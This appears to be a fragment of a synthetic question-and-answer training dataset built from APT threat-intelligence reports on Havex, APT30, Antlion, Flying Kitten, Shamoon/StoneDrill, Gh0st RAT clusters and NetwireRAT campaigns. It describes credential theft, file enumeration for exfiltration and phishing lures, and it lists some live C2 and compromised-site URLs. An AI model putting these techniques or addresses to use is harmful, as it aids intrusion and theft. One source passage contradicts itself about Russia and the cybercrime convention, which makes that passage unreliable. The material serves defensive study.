dropped and executed by the PSW dropper module (71e05babc107f5e52f1a4c3ea6261 c472d2649c0b179395304c420eaa54e2062).\nThis is a customized (?) version of BrowserPasswordDecryptor 2.0 - a free password recovery tool, developed by SecurityXploded:\nhxxp://securityxploded.com/browser-password-decryptor.php\nDescription from the developers' website:\nBrowser Password Decryptor is the FREE software to instantly recover website login passwords stored by popular web browsers.\nCurrently it can recover saved login passwords from following browsers:\n\u2022 Firefox\n\u2022 Internet Explorer\n\u2022 Google Chrome\n\u2022 Google Chrome Canary/SXS\n\u2022 CoolNovo Browser\n\u2022 Opera Browser\n\u2022 Apple Safari\n\u2022 Comodo Dragon Browser\n\u2022 SeaMonkey Browser\n\u2022 SRWare Iron Browser\n\u2022 Flock Browser\nFeatures:\n\u2022 Instantly decrypt and recover stored encrypted passwords from popular web browsers.\n\u2022 Right Click Context Menu to quickly copy the password\n\u2022 Recover password of any length and complexity.\n\u2022 Automatically discovers all supported Applications and recovers all the stored passwords.\n\u2022 Sort feature to arrange the recovered passwords in various order to make it easier to search through 100's of entries.\n\u2022 Save the recovered password list to HTML/XML/Text/CSV file\n\u2022 Easier and faster to use with its enhanced user friendly GUI interface.\n\u2022 Support for local Installation and uninstallation of the software.\nExample of file content:\n*************************************************\nBrowser Password Recovery Report\n*************************************************\nPassword List\n***********************************************************************************\nBrowser:  Firefox\nWebsite URL: https://accounts.google.com\nUser Login: mygmail\nPassword: gmailpassword\nBrowser:  Firefox\nWebsite URL: https://www.facebook.com\nUser Login: myfacebook@example.com\nPassword: ihatefacebooksomuch\nBrowser:  Opera\nWebsite URL: https://twitter.com\nUser Login: mytwitter321\nPassword: mypassword123\nBrowser:  Opera\nWebsite URL: https://login.yahoo.com\nUser Login: yahaccount\nPassword: yahpwd\nProduced by BrowserPasswordDecryptor from http://securityxploded.com/browser-password-decryptor.php\nLog Encryption In Modules\nEach module is capable of creating a log file (.yls) which is encrypted and stored on disk. The encryption library used by the modules (as well as the most recent versions of Havex) is handled by\nthe RSAeuro library. They recompiled the library several times using different compiler settings and optimization (depending of modules/Havex) which makes fingerprinting the functions a bit tedious.\nOnce the log has been compressed using bzip2, the modules use the library to generate a random 192 bit 3DES key (168 bit effective) and a 64 bit Initialization Vector. The function used to do so is R_GenerateBytes which is using the MD5 algorithm previously seeded by the R_RandomCreate function (Also using MD5):\nOnce the key and the IV have been generated, the 3DES algorithm is initialized:\nOnce 3DES is initialized, the next step is to RSA encrypt the 3DES KEY using the RSAPublicEncrypt function. It is essentially creating the PKCS #1 padding block around the key and then calling the rsapublicencrypt function.\nExample of a layout where 0x42 is the PKCS#1 padding block and 0x41 the 3DES key (original values overwritten for clarification purpose):\nThe rsapublicencrypt is basically a wrapper to various big num functions used to compute RSA:\nN parameter in one sample:\nThe E parameter is the standard 0x10001\nAfter the 3DES key is encrypted using RSA, the log files are encrypted.\nThe final encrypted log file layout looks like the following: (important parameters overwritten for clarity):\nThe YLS file format can be described as follows:\n\u2022 SIZE OF RSA Identifier: 0x29 in the figure above\n\u2022 RSA ID:  \"39ee448cf196304cfe9c6b1c2e436\". (Used by attackers to identify which RSA key was used to encrypt the 3DES Key.\n\u2022 BLOCKSIZE: 128 bytes (24 bytes from 3DES key and 104 from PKCS padding block)\n\u2022 ENCRYPTED 3DES KEY : In yellow on the figure above, replaced by \"C\"\n\u2022 3DES Initialization Vector: In red on the figure above, replaced by \"I\". Mandatory to decrypt logs.\n\u2022 3DES ENCRYPTED LOG bytes\nOnly the attackers can decrypt such a log file. They can identify which Public RSA Key was used from the identifier, and decrypt the 3DES key using their Private RSA Key. From there, they can use the 3DES Key and the Initialization Vector which is present in clear form to decrypt the log file.\nHavex sample details by version\nHAVEX version 01\nHAVEX version 02\nHAVEX version 0F\nHAVEX version 012\nHAVEX version 013\nHAVEX version 014\nHAVEX version 017\nHAVEX version 018\nHAVEX version 019\nHAVEX version 01A\nHAVEX version 01B\nHAVEX version 01C\nHAVEX version 01D\nHAVEX version 01E\nHAVEX version 01F\nHAVEX version 020\nHAVEX version 021\nHAVEX version 022\nHAVEX version 024\nwww.idweb.ru/assets/modules/docmanager/classes/dm_source.php\nHAVEX version 025\nHAVEX version 029\nHAVEX version 030\nHAVEX version 037\nHAVEX version 038\nHAVEX version 040\nHAVEX version 043\nHAVEX version 044\nIII. Appendix 3:\nThe Sysmain backdoor \u2013 detailed analysis\nDetailed analysis of first identified sample of SYSMAIN RAT. The sample set contains two variants.\nFile metadata analyzed variant\nFile metadata second variant\nOther sysmain samples:\nantibioticsdrugstore.com/err/log/source.php\nRead the text above and answer this question: How does the Havex malware identify and collect information about OPC servers within a Local Area Network (LAN)?",
    "output": "The Havex malware uses Windows Networking COM objects, specifically WNetOpenEnumW and WNetEnumResource, to look for LAN resources. For each resource found, it creates a thread that checks if it's an OPC server and retrieves detailed OPC information using specific interfaces. This information is then written to an OPCServer<nr>.txt file. The collected data is compressed using bzip2 and encrypted with a random 192-bit 3DES key before being saved to a .yls file, which is subsequently collected by the main Havex module and sent to the Command and Control (C2) server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: PROFESSIONALLY DEVELOPING TOOLS:\nAPT30 Uses a Consistently Organized\nMalware Development Approach\nTable 1: ZRLnk version history\nIn addition to APT30's long-term use of a regular set of tools, in most cases the tools themselves \u2013 while they may vary in purpose \u2013 share a consistent set of development features. In particular, the tools all exhibit a carefully managed versioning system and a consistent method for checking version information, performing updates, and ensuring only a single copy of a given tool is running on a victim host at any time. This suggests that APT30 is dedicated to maintaining a tightly run, efficient operation.\nBACKSPACE, NETEAGLE, SHIPSHAPE, and\nSPACESHIP all maintain an internal version number and include some means to check their version number against a reference version, and attempt to automatically update the malware if its version is different than the reference number. For some APT30 malware, we speculate that the version string may also describe additional properties of the malware. For instance, one variant of BACKSPACE (\"ZRLnk\") uses a version string where the first two digits indicate the malware version number. The next character may indicate the type of icon stored in the file's resource section and possibly the type of exploit document used to deliver the malware (for example, 'p' for Acrobat Reader / PDF and 'w' for Microsoft Word 2). Finally, the next character ('l') may indicate that that the malware uses a shortcut (.lnk) file to maintain persistence. 3\nSmall Headline: APT30 likely either develops their own tools or has a working relationship with developers who are able to consistently - perhaps exclusively - support them.\nWith respect to version numbers, the BACKSPACE \"ZJ\" variant has the longest revision history. Our analysis of 55 ZJ samples showed versions from 1.2 through 20.50 spanning nearly eight years (from 2005 through 2012, based on compile times).\nBesides version control, most malware used by APT30 (to include BACKSPACE, SHIPSHAPE, SPACESHIP, and FLASHFLOOD) uses a consistent methodology (a set of mutexes and events) to manage malware execution and ensure that only a single copy of a given piece of malware is running at any one time, presumably to decrease the chances of detection. The mutexes and events are highly consistent in their naming conventions, with most containing the terms 'Microsoft' or 'ZJ' or both. The mutex is created when the malware executes, and ensures only one copy is running at a time. The events use similar naming conventions as the mutexes, and are used to signal the malware and associated threads to exit.4\nThe emphasis on malware versioning implies a structured and well-managed development environment. Similarly,\nthe close attention to ensuring only one copy of a given tool is running at a time and a well-developed, automated means of update management imply that these tools are in use by a professional team of threat actors. We can infer that the threat actors are interested in maintaining the latest and greatest versions of their tools in their victims' environments. Likewise, the threat actors are likely operating at a sufficiently large scale that they benefit from the automated management of many of their tools.\nWhile there is no guarantee that the tools described in this paper are exclusive to APT30, we have not yet observed these tools used by any other threat groups. That the tools have evolved over time while maintaining a consistent amount of core functionality indicates that APT30 has development resources available to modify and customize their malware.  This implies either that APT30 is responsible for developing their own tools, or has a working relationship with developers able to support them in a consistent (and possibly exclusive) manner.\nTable 2: Mutexes and events used for process execution and version control\n\nHow does APT30 manage the versioning and updating of their malware tools, and what insights does this provide about their operational structure?",
    "output": "APT30 manages the versioning and updating of their malware tools through a carefully managed versioning system and a consistent method for checking version information, performing updates, and ensuring only a single copy of a given tool is running on a victim host at any time. This approach is evident in tools such as BACKSPACE, NETEAGLE, SHIPSHAPE, and SPACESHIP, which maintain an internal version number and include mechanisms to check their version number against a reference version and attempt to automatically update if necessary. For instance, the BACKSPACE 'ZJ' variant has a version string where the first two digits indicate the malware version number, the next character may indicate the type of icon and exploit document used, and another character indicates the persistence method. This structured and well-managed development environment suggests that APT30 operates with a professional team of threat actors who are interested in maintaining the latest versions of their tools and managing them at a large scale.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The attackers spent a significant amount of time on victim networks.\nChinese state-backed advanced persistent threat (APT) group Antlion has been targeting financial institutions in Taiwan in a persistent campaign over the course of at least 18 months.\nThe attackers deployed a custom backdoor we have called xPack on compromised systems, which gave them extensive access to victim machines.\nThe backdoor allowed the attackers to run WMI commands remotely, while there is also evidence that they leveraged EternalBlue exploits in the backdoor. The attackers appeared to have the ability to interact with SMB shares, and it's possible that they used mounted shares over SMB to transfer files from attacker-controlled infrastructure. There is also evidence that the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address.\nThe goal of this campaign appears to have been espionage, as we saw the attackers exfiltrating data and staging data for exfiltration from infected networks.\nRead the text above and answer this question: How did the Chinese state-backed APT group Antlion leverage the custom backdoor xPack to gain extensive access to victim machines, and what specific techniques did they use to facilitate data exfiltration?",
    "output": "The Chinese state-backed APT group Antlion used a custom backdoor called xPack to gain extensive access to victim machines. This backdoor allowed the attackers to run Windows Management Instrumentation (WMI) commands remotely, which provided them with administrative control over the compromised systems. Additionally, there is evidence that the attackers leveraged EternalBlue exploits within the backdoor, enabling them to exploit vulnerabilities in the Server Message Block (SMB) protocol. They also had the capability to interact with SMB shares, potentially using mounted shares over SMB to transfer files from attacker-controlled infrastructure. Furthermore, the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address. These capabilities facilitated data exfiltration by allowing the attackers to exfiltrate data and stage data for exfiltration from infected networks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What tactics does FLyING KITTeN employ to target defense and aerospace sectors, and how do these tactics contribute to their success?",
    "output": "FLyING KITTeN employs several tactics to target defense and aerospace sectors. One common tactic involves setting up spoofed login web pages on domains that closely resemble legitimate pages used by the targets. These fake web pages serve two purposes: they log credentials entered by unsuspecting users and then redirect them to another page that prompts the download of an alleged patch or update, which is actually a copy of their remote access tool. This tool is used to log keystrokes, screenshots, and other user activity on infected systems and exfiltrates this data to an attacker-controlled server. Additionally, FLyING KITTeN uses a dropper written in C# .NET that extracts and deploys a backdoor Trojan, a configuration file, and optionally a decoy. The use of these tactics contributes to their success by allowing them to effectively gather sensitive information and maintain persistent access to targeted systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 6.1. Convention on Cybercrime\nThe Council of Europe has established a treaty on cyber crime that entered into force in 2004. Twenty-two Council of Europe member nations, along with the United States, have ratified the treaty agreeing to international cooperation concerning cybercrime issues. The Russian Federation has not agreed to the treaty making it difficult for states to resolve issues with Russia concerning cyber crimes in an international forum (Council of Europe, undated a). This treaty is still significant because it is the first international treaty on crimes committed on the internet (Council of Europe, undated b).\nThe main goal of the convention, as stated in the preamble, is to protect nations against cybercrime, by adopting laws and regulations, and fostering co-operation internationally. The states that become a party to the Convention on Cybercrime agree to adopt laws that create criminal penalties for committing crimes on the internet. The convention outlines several areas that states have agreed to make criminal statutes on issues such as illegal access of computer systems, system and data interference, and other computer related fraud. Nations that are party to the convention also agree to cooperate with investigations, to provide mutual assistance concerning cyber crimes, and to pursue the collection of evidence. The extradition of alleged cybercriminals is also agreed to by parties to the treaty. Disagreements between states that have ratified the treaty include direct negotiations, settlement in front of the European Committee on Crime Problems (CDPC), a tribunal for arbitration or adjudication in front\nof the International Court of Justice. The Convention on Cybercrime gave a framework for cooperation among member states for the prosecution of cyber criminals by removing safe havens for the cyber criminals. (Council of Europe, 2001)\nHowever, Russia does agree to the convention and it protects citizens who engage in cyber misconduct by preventing their extradition out of Russia. Failing to sign the convention agreement also prevents Russia from having any legal standing to prosecute trans-national cyber criminals who attack Russia's IT infrastructure.\nMedium Headline: 6.2. Organization for Security and Co-operation in Europe\nThe Organization for Security and Co-operation in Europe (OSCE) has a tradition of promoting the security and stability of Europe. This tradition of promoting security and stability since 2004 has included cyber security. The OSCE's initial focus on cyber security concerned the use of the internet for recruiting, fundraising, and communication by terrorist organizations. In 2006 the OSCE's efforts began to focus on protecting vital information infrastructures against cyber attacks. Debate in the OSCE has not led to great change but has been a forum for further cooperation in cyber security in Europe. In June 2008, the Estonian Defence Minister, Jaak Aaviksoo, in an address to members of the OSCE, said there is \"an immense amount of work to be done [concerning cyber security].\" Minister Aaviksoo used the forum of the OSCE to use his nation's experience in defending against cyber crime to increase international cooperation in Europe. This statement by the Estonian Defence Minister sums up OSCE's efforts concerning cyber defence, they are still in the talking phase and have at least recognized the importance of cyber defence (Cornish, 2009:20-21). The OSCE will continue to be a forum to publicize grievances for European nations that have had their IT infrastructures attacked by Russian hackers. European nations will judge Russia on its cooperation with the OSCE in finding and prosecuting individuals who engage in cyber attacks.\nMedium Headline: 6.3. The European Union\nEstonia continues to lobby for improved international cooperation in cyber security as it calls on the European Union (EU) to pass legislation concerning crimes committed on the internet. While addressing the\nEuropean Parliament, Toomas Hendrik, the Estonian President, called upon the EU to pass legislation that make cyber attacks against public and private web sites a criminal act (Jones, 2008). The EU has several initiatives involving different agencies but lacks an overall cyber security strategy. The European Commission has the Information Society and Media Directorate General, the European Network and Information Security Agency (ENISA), and the Contact Network of Spam Authorities that deal with different aspects of cyber security. The Information Society and Media Directorate has a program to improve the content of the internet by protecting people from child pornography, racism, and other harmful online content. The ENISA is an agency that was created in 2004 to raise awareness of cyber security issues and to promote best practices by member nations with the EU. The Contact Network of SPAM authorities is an initiative to counter SPAM and share information on best practices between EU member nations. (Cornish, 2009:24-27)\nThe European Parliament has established several standing committees concerned with cyber security issues. The Committee on Industry, Research, and Technology (ITRE) is concerned with establishing information technology networks within the EU. The Committee on Civil Liberties, Justice, and Home Affairs (LIBE) is responsible of the protection of personal information on the internet for members of the EU. The Committee on Foreign Affairs is responsible for the Security and Security policies of the EU which includes internet security policies. (Cornish, 2009:26)\nThe European Police Office (EUROPOL) is an agency of the Police and Judicial Co-operation (PJC) that has more of a direct role in EU cyber security in the context of combating terrorism, organized crime, and financial crime (Cornish, 2009:25). Although cyber security is addressed by the EU there is no organization within the EU to ensure that there are no contradictions in cyber security policy among all of the various EU agencies, commissions, and co-operations. The European Parliament commissioned a study on cyber security published February 2009 that examined security challenges concerning the internet for the EU. The study recommended that clear roles should be defined for cyber security responses with the many EU organizations, including the establishment of the post of cyber security coordinator and the establishment of a common operating vision for cyber security in order to achieve operational consistency across the EU (Cornish, 2009:31). The EU and Russia work\ntogether on different challenges including drug and human trafficking, organized crime, and counter-terrorism. Russia is also the EU's third largest trading partner (European Commission, 2009). The EU's cyber security organizations can offer a framework for increased cooperation to defeat cyber attacks that originate from or are directed at Russia.\nMedium Headline: 6.4. The United Nations\nThe main purpose of the United Nations (UN) is to maintain international peace and security among the different nations of the world (United Nations, 1945). The focus for cyber security for the UN, through the UN Security Council, has been on countering terrorism. Debates among the UN General Assembly started in 2002 highlighted the growing dependence on IT use. Out of discussions came a warning that law enforcement activities would not be sufficient but that more efforts in cyber security need to be made on prevention. (Cornish, 2009:17)\nThe International Telecommunication Union (ITU) is the main organization that is responsible for cyber security within the UN framework. The ITU's goal is to enhance cyber security in order for individuals, businesses and nations to have confidence in the use of cyberspace. The ITU uses its Global Cyber Security Agenda, which began in 2007, to promote its goals of increased cyber security. The ITU has not been an agency for the enforcement of legislation and international agreements concerning cyber security but has focused on assisting in building nation's capabilities for cyber security (Cornish, 2009:17-18). Former Soviet satellites can cooperate with the ITU to improve their cyber defences against cyber criminals from Russia or any other nation. The UN will continue to be a forum for Russia to voice grievances or defend themselves against world opinion in matters involving international peace and security including cyber security.\nMedium Headline: 6.5. Relevance of multilateral initiatives\nAlthough the Russian government cooperates with Europe and other nations on a variety of economic and security issues, individuals, organizations, and governments are able to exploit the weaknesses of the international system in order to use the internet for criminal activities without fear of any major reprisals. Significant effort has been made towards cyber security since the cyber attack on Estonia in 2007, but much\nmore needs to be done among national and international organizations to ensure genuine cyber security. The framework for increasing cyber security exists, but it will take the cooperation of many nations, including Russia, to make a difference in cyber security.\n\nWhat are the key initiatives and agencies within the European Union (EU) that address cyber security, and what challenges does the EU face in implementing a coherent cyber security strategy?",
    "output": "A: Key initiatives and agencies within the EU include the Information Society and Media Directorate General, the European Network and Information Security Agency (ENISA), and the Contact Network of Spam Authorities. The EU also has several standing committees, such as the Committee on Industry, Research, and Technology (ITRE), the Committee on Civil Liberties, Justice, and Home Affairs (LIBE), and the Committee on Foreign Affairs. However, the EU lacks an overall cyber security strategy and faces challenges in ensuring consistency across its various agencies and commissions. A study recommended defining clear roles for cyber security responses and establishing a common operating vision for cyber security.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: What is new in this report?\nThis report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:\n1. The discovery techniques and strategies we used for Shamoon and StoneDrill.\n2. Details on the ransomware functionality found in Shamoon 2.0. This functionality is currently inactive but could be used in future attacks.\n3. Details on the newly found StoneDrill functions, including its destructive capabilities (even with limited user privileges).\n4. Details on the similarities between malware styles and malware components' source code found in Shamoon, StoneDrill and NewsBeef.\nMedium Headline: 1.1. Shamoon: It's all about the \"resources\"\nFew people ever expected the return of Shamoon after four years of silence. This made the news from the Middle East on 17 November 2016 quite surprising, and sent multiple shockwaves through the industry. After the second wave of attacks, which took place on 29 November 2016, it became quite clear that Shamoon 2.0 was no longer an isolated incident, but part of a new series of attacks and we should expect more waves coming in. In order to make sure that Kaspersky Lab customers were protected, we started to develop specific detection strategies and hunt for possible new variants.\nTo create the new detections, we used multiple ideas:\n\u25cf The Shamoon wipers have their additional payloads stored as encrypted resources.\n\u25cf Just like in 2012, the early Shamoon 2.0 samples used resources with three very specific names - \"PKCS7\", \"PKCS12\" and \"X509\". Because of their uniqueness it was relatively easy to find and detect them just by the resource names and their high entropy. Unfortunately, newer versions had random resource names like \"ICO\", \"LANG\" and \"MENU\", so the ability to easily find new samples was lost.\nHowever, all programmers, especially malware writers, have their own habits, and the authors of Shamoon are no exception:\n\u25cf Since the Shamoon 1.0 story, from 2012 (6dd571b84470ad9caad30a6a6acf491e) until 2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one additional encrypted resource with a specific, although non-unique name \"101\".\nThis finding got us thinking that the Shamoon attackers can re-use this pattern and we've investigated ways of using this to hunt for new, unknown malware generations from their side.\nAs researchers, we tested a lot of different approaches to find similar malicious samples based on this artefact, and one of them worked unexpectedly. Here's the logic we used to create the detection:\n1. We assumed that for the next waves of attack the authors would continue to recompile the Shamoon 2.0 version from 2016, while trying to avoid AV detection, so we focused mostly on the newest Shamoon versions.\n2. We assumed that the wiper would again enumerate all files inside folders, so it would still call Windows API functions FindFirstFile and FindNextFile.\n3. Because it uses encrypted resources, we assumed that it would find and load them with the Windows API functions FindResource and LoadResource.\n4. Inside all known versions of Shamoon 2.0, the resource \"101\" was found, with the following properties:\n\u25cf Level of entropy > 7.8 - that means the data inside is encrypted or compressed.\n\u25cf Size about 30 KB - we've decided to set the minimum limit at 20 KB.\n\u25cf Language = neutral (not set); all other resources had the languages \"Arabic (Yemen)\" or \"English United States\".\n\u25cf Does not contain an unencrypted PE executable file inside.\nAfter initial testing, we decided to add more search criteria to limit the number of possible false positive detections:\n\u25cf Shamoon samples had no digital signature, so the sample would be unsigned.\n\u25cf All known Shamoon samples with resource \"101\" had a maximum file size of 370 KB, so it's reasonable to limit the file size to twice that number - 700 KB.\n\u25cf The number of resources inside the sample should not be too high - less than 15.\nOur favorite malware hunting tool, , provides a rule-bused approach to create descriptions of malware families based on textual or binary patterns.\nHere's the detection rule we wrote using all the above conditions:\nWhile running the above Yara rule on Kaspersky Lab's samples selection, we found an interesting, fresh sample. After a quick analysis, we realized it was yet another wiper. However, it was not Shamoon, but something different. We've decided to call it StoneDrill.\nMedium Headline: 1.2. From StoneDrill to NewsBeef\nHaving identified the StoneDrill sample through the Yara technique above, we started looking for other possibly related samples.\nOne Yara technique that has proved useful in the past for finding new malware variants is the development of Yara rules for decrypted malware components. During attacks, malware components can be changed to fit the attackers' requirements, so hunting for decrypted malware code might help in finding new malware variants or even older samples.\nWith StoneDrill, we developed several Yara rules for the decrypted payloads. Here's one of our Yara rules for a decrypted StoneDrill module:\nInterestingly, this rule allowed us to find a new category of samples, which we previously connected with a threat actor named NewsBeef. We wrote about roughly one year ago, in relation to another set of attacks against oil and energy companies from the Middle East.\nFurther analysis indicated the malware samples from StoneDrill and NewsBeef appear to be connected together through numerous internal similarities.\nThe use of simple logic in conjunction with a knowledge of Yara can help attain a state-of-the-art outcome in malware hunting activity. If you would like to learn more, you can join us for the Yara training \"\" and the advanced \"\" on April 1-2, 2017 in St. Maarten.\nSeveral private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to subscribers of .\nFor more information please contact:\nQuestion: How did Kaspersky Lab leverage the 'resources' in Shamoon 2.0 to develop effective detection strategies, and what specific attributes were used to identify potential new variants?",
    "output": "Answer: Kaspersky Lab utilized the encrypted resources within Shamoon 2.0 to develop detection strategies. They noticed that Shamoon wipers store additional payloads as encrypted resources. Early samples used specific resource names like 'PKCS7', 'PKCS12', and 'X509', making them easier to detect. Newer versions used random names, but the presence of a resource named '101' with high entropy, a size around 30 KB, and neutral language settings was a consistent pattern. By focusing on these attributes, such as the use of Windows API functions like FindFirstFile, FindNextFile, FindResource, and LoadResource, and setting limits on file size and the number of resources, they created a Yara rule to hunt for new variants.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Cluster: PCRat\nThis cluster contains 25 samples, and is linked with the HEART cluster (see HEART), the 7hero cluster (see 7hero) as well as the main Gh0st cluster through the common C&C at tajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.\nPCRat samples have been documented used against Uyghur groups (11).\nIt is debatable how valid the PCRat connections are. There is apparently a commercially available modification of Gh0st rat called PCRat, which we have not yet seen copies of. If that kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.\nBig Headline: Cluster: World\nThe World cluster consists of seven samples.\nSamples in this cluster all give the impression that they use hardcoded IP addresses for their C&C communication. This is because the real C&C ip is not stored in the executable, but exists base64 encoded in a text file downloaded from a remote site. Thus these files are shown with two C&C connections.\nThis cluster does not seem linked with other clusters. However, there is a strong resemblance between these samples and some samples in the Wangz cluster (e.g. c577b5a8d07982a2c6c42a7352c0cef8).\nBig Headline: Conclusions\nThis study shows the presence of several logical links between different Ghost campaigns: Links between malware type (in this case illustrated by the network protocol magic tag), links in the C&C infrastructure and to some extent links in the registration information.\nDue to the necessary scope limitation, many other links had to remain unexamined. However, the present work shows that some of the most active and prolific malware campaigns share enough connections indicate that the same groups or individuals are involved.\nIn the cases where we have been able to say something about the entities responsible for the attacks, it seems apparent that the persons involved can be considered career criminals. These are people that have their hand in many different types of online crime, have been doing it for quite some time, and often target victims inside China itself.\nSmaller clusters are in many ways more interesting. They are often more difficult to track, as they obviously leave less clues as to who is behind the attack and what the purpose is. Clusters that have been involved in targeted attacks typically belong to these.\nBig Headline: References\n1. Wikipedia. GhostNet. Wikipedia. [Online] http://en.wikipedia.org/wiki/GhostNet.\n2. Clean-MX. wt1888.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=wt1888.com.\n3. Clean-MX. 81266966.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=81266966.com.\n4. beishan.info. [Online] http://bbs.beishan.info/thread-849-1-1.html.\n5. cyberpolice.cn. Nanchang Cyberpolice. [Online] http://www.nanchang.cyberpolice.cn/show_news.asp?ID=1160.\n6. Blasco, Jaime. Targeted attacks against Tibet organizations. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/.\n7. Villeneuve, Nart. The Significance of the \"Nitro\" Attacks. Trend Micro. [Online] http://blog.trendmicro.com/the-significance-of-the-nitro-attacks/.\n8. Command Five Pty Ltd. Command and Control in the Fifth Domain. [Online] http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf.\n9. University of Toronto. Recent Observations in Tibet-Related Information Operations: Advanced Social Engineering for the Distribution of LURK Malware. Citizen Lab. [Online] https://citizenlab.org/wp-content/uploads/2012/07/10-2012-recentobservationsintibet.pdf.\n10. Walton, Greg. Tibetan journalists targeted by Gh0stRAT in Protest pictures.rar. MalwareLab. [Online] https://malwarelab.zendesk.com/entries/21199507-tibetan-journalists-targeted-by-gh0strat-in-protest-pictures-rar.\n11. Blasco, Jaime. New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/.\n12. Giuliani, Gianluca og Sharf, Elad. Nepalese government websites compromised to serve Zegost RAT . Websense Security Labs Blog. [Online] http://community.websense.com/blogs/securitylabs/archive/2012/08/08/nepalese-government-websites-compromised-to-serve-zegost-backdoor.aspx.\n\nQ: What unique characteristics distinguish the World cluster within the Gh0st RAT campaigns, and how do these characteristics impact the analysis and detection of these threats?",
    "output": "A: The World cluster consists of seven samples that appear to use hardcoded IP addresses for their C&C communication. However, the real C&C IP is not stored in the executable but exists base64 encoded in a text file downloaded from a remote site, leading to two C&C connections being displayed. This cluster does not seem linked with other clusters but shares a strong resemblance with some samples in the Wangz cluster. The use of base64 encoding and remote text files for C&C IPs makes the analysis and detection of these threats more challenging, as the actual C&C IP is not immediately visible within the malware sample itself.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What strategies have organizations adopted to enhance their cybersecurity posture, particularly in light of regulations like GDPR? How have these strategies influenced the handling of personally identifiable information (PII)?",
    "output": "Organizations have adopted several strategies to enhance their cybersecurity posture, driven partly by regulations like GDPR. These include increased executive support and awareness of cybersecurity, the implementation of incident response retainer agreements, and the use of tabletop exercises. Specifically, organizations falling under GDPR have placed greater importance on improving their data protection initiatives. This has led to more attention and protections for PII, including segregation, tokenization/masking, encryption, and more aggressive data purging policies. However, many organizations are still in the early stages of preparing for these regulations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Trident Ursa, a Russian APT group, utilize phishing tactics to compromise Ukrainian targets and what measures can be taken to prevent such attacks?",
    "output": "Phishing is a type of social engineering attack where adversaries send electronically delivered messages to gain access to victim systems. In the case of Trident Ursa, a Russian APT group, phishing plays a significant role in their operations against Ukrainian targets. According to recent research, Trident Ursa has been using phishing tactics, including sending malicious HTML files and Word documents, to compromise Ukrainian targets. To prevent such attacks, organizations can implement a security posture that favors prevention, including searching network and endpoint logs for indicators of compromise, ensuring cybersecurity solutions are effectively blocking against active infrastructure, and implementing a DNS security solution to detect and mitigate DNS requests for known C2 infrastructure. Additionally, organizations can apply additional scrutiny to all network traffic communicating with suspicious IP addresses and consider blocking certain domains and services, such as Telegram Messaging and domain lookup tools, if they are not necessary for business operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: File enumerators\nApart from the two RATs, we've also observed specialized reconnaissance malware being deployed on the victim's endpoints instead of a RAT family. The attackers deployed a preliminary recon tool to enumerate specific folders looking for certain file extensions. The file listings/paths found are uploaded to an attacker-controlled C2 server.\nThe locations targeted were:\nC:\\Users\\<current_user>\\Downloads\\\nC:\\Users\\<current_user>\\Desktop\\\nC:\\Users\\<current_user>\\Documents\\\nC:\\Users\\<current_user>\\OneDrive\\Downloads\\\nC:\\Users\\<current_user>\\OneDrive\\Desktop\\\nC:\\Users\\<current_user>\\OneDrive\\Documents\\\nThe file extensions searched for were:\n.txt, .doc, .dot, .wbk, .docx, .docm, .dotx, .dotm, .docb, .xls, .xlt, .xlm, .xlsx, .xlsm, .xltx, .xltm, .xlsb, .xla, .xlam, .xll, .xlw, .ppt, .pot, .pps, .pptx, .pptm, .potx, .potm, .ppam, .ppsx, .ppsm, .sldx, .sldm, .pdf\nFile enumerator malware module looking for specific file extensions.\nMedium Headline: Targeting\nAn extremely common theme of maldocs and archives discovered in this campaign refers to the Government of India's Kavach application. This is a two-factor authentication (2FA) application used by government employees to access their emails. This theme has been used recently by the SideCopy APT's campaigns targeting Indian government personnel, as well. Some of the malicious artifacts using the Kavach theme in the current campaign are named:\nKAVACH-INSTALLATION-VER-1.docm\nKAVACH-INSTALLATION-VER1.5.docm\nKAVACH-INSTALLATION-VER-3.docm\nkavach-2-instructions.zip\nkavach-2-instructions.exe\nKAVACH-INSTALLATION-V3.zip\nKAVACH-INSTALLATION-V3.exe\nOther file names indicating targeting of military and government personnel consist of:\nCONFD-PERS-Letter.docm\nPERS-CONFD-LETTER.exe\nAdmiral_Visit_Details_CONFD.exe\nPay and Allowance Details.xls\nSmall Headline: Compromised websites\nThe attackers have relied on a combination of compromised websites and fake domains to carry out their operations \u2014 a tactic similar to that of the Transparent Tribe APT group. However, what stands out in this campaign is the focus on compromising quasi-military or government-related websites to host malicious payloads. This might have been done to appear legitimate to victims and analysts.\nFor example, the attackers compromised and maintained access to a quasi-defense-related website dsoipalamvihar[.]co[.]in belonging to the Defence Services Officers' Institute (DSOI) using it to host netwireRAT-related payloads since January 2021. In another instance, the attackers compromised the website for the Army Public Schools of India (apsdigicamp[.]com) to host a variety of malicious archives serving NetwireRAT again.\nOn the other hand, the attackers used a fake domain govrn[.]xyz in July 2021 to host maldocs for their infection chains.\nMalicious scripts and payloads hosted on a compromised 